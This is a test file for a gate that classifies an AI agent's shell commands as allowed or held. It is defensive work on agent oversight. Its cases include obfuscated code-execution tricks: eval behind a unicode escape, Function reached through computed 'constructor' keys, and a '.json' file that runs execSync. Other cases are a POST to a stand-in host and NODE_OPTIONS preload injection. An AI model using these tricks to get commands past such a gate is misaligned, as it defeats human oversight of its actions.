import { describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * An outward module in the working directory that a command neither runs nor
 * imports: Node and Bun load only the script, its import graph and the preload
 * flags, so an inline program that reads JSON as text is not outward because
 * of it. A `.json` module the program requires or imports is read as its
 * code: the commands its strings name count once code read for the run can
 * run a command.
 */

const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const COMMON = join("/", "fake", "repo", ".git");

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets")],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const PACKAGE_JSON = JSON.stringify(
  { name: "standup", version: "1.2.3", main: "proxy.mjs", description: "tmux is how sessions run", scripts: { start: "node proxy.mjs", test: "bun test", release: "git push origin HEAD" } },
  null,
  2,
);
/** A checkout of Standup's own repository under the temp dir, with its root package.json. */
const REPO = join("/", "tmp", "standup-copy");
const ROOT_PACKAGE_JSON = `{
  "name": "standup",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "workspaces": [
    "packages/*"
  ],
  "scripts": {
    "dev": "bun run scripts/dev.ts",
    "setup": "bun run scripts/setup-hooks.ts",
    "setup:codex": "bun run scripts/setup-hooks.ts --codex",
    "setup:remove-codex": "bun run scripts/setup-hooks.ts --remove-codex",
    "slack:start": "bun --env-file=packages/slack/.env packages/slack/src/index.ts",
    "test": "bun test",
    "test:live": "bun packages/web/e2e/live-updates.e2e.ts",
    "build": "bun run --filter '*' build",
    "typecheck": "bun run --filter '*' typecheck"
  },
  "devDependencies": {
    "@types/bun": "^1.1.14",
    "typescript": "^5.7.2"
  }
}
`;
const SETUP_HOOKS = 'import { execSync } from "child_process";\nexecSync("systemctl --user restart standup");\nexecSync("tmux kill-server");\nexecSync("codex exec hi");\n';
const LIVE_E2E = 'import { spawn } from "child_process";\nspawn("tmux", ["kill-server"]);\n';
const COMMON_REPO = join(REPO, ".git");
/** A `.json` file whose text is JS, not JSON. */
const NOT_JSON = 'require("child_process").execSync("git push origin HEAD");\n';
const PROXY =
  'import http from "node:http";\n' +
  "http.createServer((req, res) => {\n" +
  '  fetch("https://collector.example.com/ingest", { method: "POST", body: req }).then((r) => r.body.pipeTo(res));\n' +
  "}).listen(8080);\n";

const FILES: Record<string, string> = {
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
  [join(ROOT, "package.json")]: PACKAGE_JSON,
  [join(ROOT, "proxy.mjs")]: PROXY,
  [join(ROOT, "data.json")]: '{"x":1}',
  [join(ROOT, "x.json")]: '{"a":1}',
  [join(ROOT, "evil.json")]: NOT_JSON,
  [join(ROOT, "cfg.json")]: JSON.stringify({
    cmd: "git push origin HEAD",
    url: "https://evil.example.com/x",
    db: join(DATA, "standup.db"),
    k: "constructor",
    code: 'require("child_process").execSync("git push origin HEAD")',
    mod: "proxy.mjs",
  }),
  [join(ROOT, "src", "computed-key.ts")]: 'import j from "../cfg.json";\nconst { ["con" + "structor"]: S } = "";\nconst { ["con" + "structor"]: F } = S;\nF(j.code)();\n',
  [join(ROOT, "src", "json-escaped-eval.js")]: 'const j = require("../cfg.json");\n\\u0065val(j.code);\n',
  [join(ROOT, "run.js")]: 'module.exports = (cmd) => require("child_process").execSync(cmd);\n',
  [join(DATA, "standup.db")]: "",
  [join(REPO, ".git", "HEAD")]: "ref: refs/heads/main\n",
  [join(REPO, "package.json")]: ROOT_PACKAGE_JSON,
  [join(REPO, "scripts", "setup-hooks.ts")]: SETUP_HOOKS,
  [join(REPO, "scripts", "dev.ts")]: SETUP_HOOKS,
  [join(REPO, "packages", "web", "e2e", "live-updates.e2e.ts")]: LIVE_E2E,
};

function probes(): Partial<FloorProbes> {
  const dirs = new Set<string>(["/", "/tmp", ROOT]);
  for (const f of Object.keys(FILES)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : dir === REPO ? COMMON_REPO : null),
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || dirs.has(p),
    isDirectory: (p) => dirs.has(p),
    listDir: (p) => (dirs.has(p) ? [...new Set([...Object.keys(FILES), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null),
    realpath: (p) => (p in FILES || dirs.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, cwd = ROOT): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes());
}

function expectAllowed(v: FloorVerdict): void {
  expect(v).toEqual({ action: "allow" });
}

function expectHeld(v: FloorVerdict, category: string): void {
  expect(v).toMatchObject({ action: "hold", category });
}

describe("6. an outward module in the cwd that nothing runs or imports", () => {
  const reads = [
    `node -e 'console.log(JSON.parse(require("fs").readFileSync("data.json","utf8")).x)'`,
    `cat x.json | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).a))'`,
    `bun -e 'console.log(JSON.parse(require("fs").readFileSync("data.json","utf8")).x)'`,
    `cat x.json | bun -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).a))'`,
  ];
  test.each(reads)("allows %p", (command) => {
    expectAllowed(bash(command));
  });

  test("JSON this command writes is still data", () => {
    expectAllowed(bash(`echo '{"scripts":{"x":"git push origin HEAD"}}' > w.json && node -e 'console.log(require("./w.json").scripts.x)'`));
  });

  // A required or imported package.json is read as the code's own, but code that can run no command runs none of the commands its scripts name.
  test.each([
    `node -e 'const j=require("./package.json"); console.log(j.version)'`,
    `bun -e 'const j=require("./package.json"); console.log(j.version)'`,
    `node -p 'require("./package.json").scripts.start'`,
    `node --input-type=module -e 'import p from "./package.json" with { type: "json" }; console.log(p.version)'`,
    `bun -e 'import p from "./package.json"; console.log(p.version)'`,
    `node -e 'import("./package.json", { with: { type: "json" } }).then((m) => console.log(m.default.version))'`,
  ])("allows %p, whose package.json names commands nothing runs", (command) => {
    expectAllowed(bash(command));
  });

  // The root package.json's scripts name files that end sessions and restart the service; reading them runs none.
  test("reading Standup's own root package.json through require is allowed", () => {
    const read = `node -e 'const j=require("./package.json"); console.log(JSON.stringify(j.scripts,null,1))' | head -40`;
    expectAllowed(bash(`cd ${REPO} && ${read}`));
    expectAllowed(bash(read, REPO));
    expectAllowed(bash(`node -p 'require("./package.json").scripts["test:live"]'`, REPO));
  });

  test("the scripts it names still hold when they run", () => {
    expect(bash("bun run setup", REPO).action).toBe("hold");
    expect(bash("bun run test:live", REPO).action).toBe("hold");
    expect(bash("bun scripts/setup-hooks.ts", REPO).action).toBe("hold");
  });

  test.each([
    `node -e 'const j=require("./cfg.json"); "".constructor.constructor(j.code)()'`,
    `node -e 'const j=require("./cfg.json"); j[j.k][j.k](j.code)()'`,
    `node -e 'const j=require("./cfg.json"); Object.getOwnPropertyDescriptor(Object.getPrototypeOf(()=>0), j.k).value(j.code)()'`,
    `node -e 'const j=require("./cfg.json"); require("./run.js")(j.cmd)'`,
    `node -e 'const j=require("./cfg.json"); import("./" + j.mod)'`,
    `node -e 'const j=require("./cfg.json"); require("./" + j.mod)'`,
    `node -e 'const j=require("./cfg.json"); globalThis.eval(j.code)'`,
    `node -e 'const j=require("./cfg.json"); process.mainModule.require("child_process").execSync(j.cmd)'`,
  ])("holds %p, which can hand a JSON value to code that runs it", (command) => {
    expect(bash(command).action).toBe("hold");
  });

  test.each([
    `node -e 'const j = require("./cfg.json"); const { ["con"+"structor"]: S } = ""; const { ["con"+"structor"]: F } = S; F(j.code)()'`,
    `bun -e 'import j from "./cfg.json" with { type: "json" }; const { ["con"+"structor"]: S } = ""; const { ["con"+"structor"]: F } = S; F(j.code)()'`,
    "bun src/computed-key.ts",
    `node -e 'const j = require("./cfg.json"); const a = /"/.source, r = "".constructor.constructor(j.code)(), b = /"/.source'`,
    `node -e 'const j = require("./cfg.json"); const o = { [j.k]() {} }; o[j.k][j.k](j.code)()'`,
  ])("holds %p, which reaches a JSON value's runner by a name the scan can't see", (command) => {
    expect(bash(command).action).toBe("hold");
  });

  test("code that hands a JSON value to a command, a request or a file read still holds", () => {
    expect(bash(`node -e 'require("child_process").execSync(require("./cfg.json").cmd)'`).action).toBe("hold");
    expect(bash(`node -e 'require("child_process").execSync(require("./package.json").scripts.release)'`).action).toBe("hold");
    expect(bash(`node -e 'fetch(require("./cfg.json").url, { method: "POST", body: "x" })'`).action).toBe("hold");
    expect(bash(`node -e 'console.log(require("fs").readFileSync(require("./cfg.json").db, "utf8"))'`).action).toBe("hold");
  });

  test("a .json file that isn't JSON is read as the code it is", () => {
    expectHeld(bash(`node -e 'require("./evil.json")'`), "outward");
    expectHeld(bash(`echo 'require("child_process").execSync("git push origin HEAD")' > x.json && node -e 'require("./x.json")'`), "outward");
  });

  const runs = [
    "node proxy.mjs",
    "bun proxy.mjs",
    "node ./proxy.mjs",
    `node -e 'require("./proxy.mjs")'`,
    `node -e 'import("./proxy.mjs")'`,
    `bun -e 'require("./proxy.mjs")'`,
    "node --import ./proxy.mjs -e 1",
    "node --require ./proxy.mjs -e 1",
    "NODE_OPTIONS=--require=./proxy.mjs node -e 1",
    "NODE_OPTIONS='--import ./proxy.mjs' node -e 1",
  ];
  test.each(runs)("holds %p, which runs the module", (command) => {
    expectHeld(bash(command), "outward");
  });

  test("a package.json script that runs the module still holds", () => {
    expectHeld(bash("npm start"), "outward");
    expectHeld(bash("bun run start"), "outward");
  });
});

describe("a JSON value handed to a runner named through a unicode escape holds", () => {
  test.each([
    `node -e 'const j=require("./cfg.json"); \\u0065val(j.code)'`,
    `bun -e 'const j=require("./cfg.json"); \\u0065val(j.code)'`,
    `node -e 'const j=require("./cfg.json"); new F\\u0075nction(j.code)()'`,
    `node -e 'const j=require("./cfg.json"); eval(j.code)'`,
    "node src/json-escaped-eval.js",
  ])("holds %p", (command) => {
    expect(bash(command).action).toBe("hold");
  });
});
